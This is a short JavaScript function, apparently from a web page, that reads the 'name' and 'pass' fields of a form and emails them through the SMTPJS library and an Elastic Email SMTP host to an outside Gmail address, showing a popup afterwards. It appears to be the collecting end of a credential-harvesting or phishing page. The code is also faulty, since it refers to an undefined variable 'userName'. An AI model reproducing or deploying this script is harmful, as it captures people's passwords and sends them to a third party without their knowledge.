function emailSend(){

	var name = document.getElementById('name').value;
	var pass = document.getElementById('pass').value;

	var messageBody = "Name " + userName +
	"<br/> Name " + name +
	"<br/> Pass " + pass;
	Email.send({
    Host : "smtp.elasticemail.com",
    Username : "fpaes41@gmail.com",
    Password : "",
    To : 'proffelipegpaes@gmail.com',
    From : "fpaes41@gmail.com",
    Subject : "This is the subject",
    Body : messageBody
}).then(
  message => {
  	if(message=='OK'){
  		swal("Secussful", "You clicked the button!", "success");
  	}
  	else{
  		swal("Error", "You clicked the button!", "error");
  	}
  }
);
}
